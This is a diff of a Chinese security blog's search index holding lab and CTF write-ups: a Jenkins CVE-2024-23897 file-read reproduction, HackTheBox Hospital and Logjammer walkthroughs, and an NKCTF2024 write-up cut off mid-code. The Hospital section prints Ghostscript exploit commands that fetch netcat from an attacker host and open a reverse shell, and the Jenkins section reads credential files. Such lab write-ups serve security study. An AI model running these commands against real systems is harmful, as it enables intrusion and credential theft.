-<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
-<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
-<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
-<p>比如使用help命令能读取前两行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
-<p>使用keep-build命令，可以读取文件第3行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
-<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
-<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
-<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
-<ul>
-<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
-<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
-<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
-<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
-</ul>
-<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到用户名<code>admin_6382705393240952219</code></p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
-<p>接着读取到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
       </categories>
   </entry>
   <entry>
@@ -685,82 +423,182 @@
       </tags>
   </entry>
   <entry>
-    <title>Logjammer-HackTheBox</title>
-    <url>/article/Logjammer-HackTheBox.html</url>
-    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
+    <title>Hospital-HackTheBox</title>
+    <url>/article/Hospital-HackTheBox.html</url>
+    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
 <span id="more"></span>
 
+<h1 id="Hospital-HackTheBox"><a href="#Hospital-HackTheBox" class="headerlink" title="Hospital-HackTheBox"></a>Hospital-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240112180806750.png"></p>
+<p>发现8080端口和443端口有http服务</p>
+<p>然后发现3389端口是启用了ms-wbt-server服务</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115204915296.png"></p>
+<p>在对443端口的扫描没有收获，并且只有邮箱登录界面无法注册</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115164807440.png"></p>
+<p>接着看向8080端口，我们随便注册用户登录后发现有文件上传功能</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115164932259.png"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>经过测试pht和phar后缀都可以绕过检测，然后dirsearch扫描出文件上传路径为<code>/uploads/</code></p>
+<p>尝试上传一句话木马，发现虽然能成功但是并不能执行命令</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115165831471.png"></p>
+<p>于是借助大神写的shell工具来反弹shell <a href="https://github.com/flozz/p0wny-shell">脚本链接</a></p>
+<p>直接下载shell.php然后上传，用bp将php后缀改为phar（后面测试了一下发现pht后缀会有问题，只能显示源码不解析）</p>
+<p>然后访问文件保存路径<code>/uploads/shell.phar</code></p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115171307639.png"></p>
+<p>由于不稳定我们反弹到本地机器上</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115171656947.png"></p>
+<p>经过一番搜索，在<code>/var/ww/html/config.php</code>找到数据库用户和密码</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115172212732.png"></p>
+<p>然后连接数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h localhost</span><br></pre></td></tr></table></figure>
 
+<p>找到用户信息</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115172643646.png"></p>
+<p>对admin的解码一下得到密码（早知道弱口令爆破了hhh）</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115173020295.png"></p>
+<p>不过好像没什么用</p>
+<p>于是参考国外师傅wp原来是利用Ubuntu内核版本漏洞去提权 <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">exp链接</a></p>
+<p>我们把exp下载到本地然后开启http服务，在靶机用wget命令复制过去</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115181536436.png"></p>
+<p>然后chmod给个执行权限，成功提权</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115181701556.png"></p>
+<p>这里的root并不是真正的root用户，所以我们还得寻找可用信息</p>
+<p>我们查看当前用户的哈希值，发现有drwilliams的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
 
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
-<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
-<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
-<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
-<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
-
-<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
-<p>很明显是出站，英文就是outbound</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
-<p>审计策略更改的日志 ID 为 <code>4719</code></p>
-<p>子类为<code>Other Object Access Events</code></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115182451909.png"></p>
+<p>然后用john爆破得到密码</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115184235946.png"></p>
+<p>得到密码后访问443端口登录后，注意到一封邮件</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115200651567.png"></p>
+<p>谷歌翻译一下，应该是要给Brown发送.eps文件</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115200710233.png"></p>
+<p>网上搜索出相关漏洞 <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
 <blockquote>
-<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
+<p>漏洞原理大概就是GPL PostScript&#x2F;PDF 解释器 Ghostscript 无法正确处理管道设备的权限验证，如果处理格式错误的文档文件，可能会导致执行任意命令</p>
 </blockquote>
-<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
-<p>在前一题的TaskContent找到路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
+<p>我们可以这样利用，先用该exp去创建第一个<code>.eps</code>文件构造curl命令我们本地的nc程序，然后Brown使用解释器打开后触发该命令下载nc程序；然后再次发送一个<code>.eps</code>文件去利用nc执行主动弹shell的命令</p>
+<p>注意被攻击机为Brown的windows系统</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115201559484.png"></p>
+<p>执行过程如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;curl 10.10.14.54:8000/nc64.exe -o nc.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>
 
+<p>下载nc64.exe并保存为nc.exe</p>
+<p>成功下载nc程序<img src="/article/Hospital-HackTheBox/image-20240115202041934.png"></p>
+<p>然后就再发一个邮件去主动nc连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;nc.exe 10.10.14.54 1028 -e cmd.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>
 
+<p>发送后被Brown打开，成功nc连接</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115204415877.png"></p>
+<p>然后dir找到文件，查看一下得到密码</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115204646134.png"></p>
+<p>由于我们前面namp扫描出3389端口是ms-wbt-server服务，我们就可以尝试连接一下</p>
+<p>开始我是使用xfreerdp工具连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:drbrown /v:10.10.11.241</span><br></pre></td></tr></table></figure>
 
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
+<p>然后惊讶的发现直接连接到被攻击机</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115210010248.png"></p>
+<p>访问桌面得到user的flag（不过确实不太方便root提权）</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>所以就换成rpcclient连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U drbrown 10.10.11.241</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
-<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
-<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
-<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
-<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
-<blockquote>
-<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
-</blockquote>
-<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
-<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
-<p>切换到System日志文件，找到被删除的日志文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
+<p>然后执行querydispinfo命令，查看关于当前连接到计算机的显示器的详细信息</p>
+<p>注意到管理员信息是与访客共享的</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115211414355.png"></p>
+<p>那么我们可以在刚刚连接的windows靶机上，curl我们本地的shell文件来实现RCE</p>
+<p>（shell.php前文已经给了参考链接）</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115212041160.png"></p>
+<p>由于知道是共享的，所以我们直接访问<code>/shell.php</code>得到root的flag</p>
+<p><img src="/article/Hospital-HackTheBox/image-20240115211953335.png"></p>
 ]]></content>
       <categories>
-        <category>日志分析</category>
+        <category>渗透</category>
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-        <tag>Windows</tag>
+        <tag>提权</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>IClean-HackTheBox</title>
+    <url>/article/IClean-HackTheBox.html</url>
+    <content><![CDATA[<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
+    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
+    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
+<span id="more"></span>
+
+<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
+<p>cd进入目录下，依次执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>访问8080端口即可</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
+<blockquote>
+<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
+</blockquote>
+<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
+<p>Jenkins有几种鉴权方案：</p>
+<ul>
+<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
+<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
+<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
+<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
+</ul>
+<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
+<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
+<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
+<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
+<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
+<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
+<p>总结一下就是：</p>
+<ul>
+<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
+<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
+</ul>
+<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
+<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
+<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
+<p>比如使用help命令能读取前两行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
+<p>使用keep-build命令，可以读取文件第3行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
+<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
+<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
+<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
+<ul>
+<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
+<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
+<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
+<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
+</ul>
+<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名<code>admin_6382705393240952219</code></p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
+<p>接着读取到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Meerkat-HackTheBox</title>
@@ -954,80 +792,165 @@
       </tags>
   </entry>
   <entry>
-    <title>NKCTF2024</title>
-    <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
-    <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
+    <title>Headless-HackTheBox</title>
+    <url>/article/Headless-HackTheBox.html</url>
+    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
 <span id="more"></span>
 
-<h1 id="NKCTF-2024-web解析"><a href="#NKCTF-2024-web解析" class="headerlink" title="[NKCTF 2024]web解析"></a>[NKCTF 2024]web解析</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
-<p>扫一下发现存在后台登陆界面，直接访问</p>
-<p>用字典爆破下admin的密码为Admin123</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png"></p>
-<p>然后直接登录，去漏洞库搜一下其实存在很多漏洞（重点看最近的）</p>
-<p>找到CMS Made Simple的RCE漏洞（CVE-2019-9059）<a href="https://www.exploit-db.com/exploits/49345">参考文章</a></p>
-<p>步骤如下</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png"></p>
-<p>登陆后按照上图，保存后去执行代码</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png"></p>
-<p>成功反弹shell，得到flag</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png"></p>
-<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>扫目录发现存在<code>/secret</code>源码泄露</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.use(bodyParser.json())</span><br><span class="line">.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">.use(express.static(path.join(__dirname, &#x27;/public&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">    res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">    if(code.match(pattern))&#123;</span><br><span class="line">        throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">        let code = req.body.code;</span><br><span class="line">        let sandbox = Object.create(null);</span><br><span class="line">        let context = vm.createContext(sandbox);</span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context);</span><br><span class="line">            console.log(result);</span><br><span class="line">        &#125; catch (e)&#123;</span><br><span class="line">            console.log(e.message);</span><br><span class="line">            require(&#x27;./hack&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span 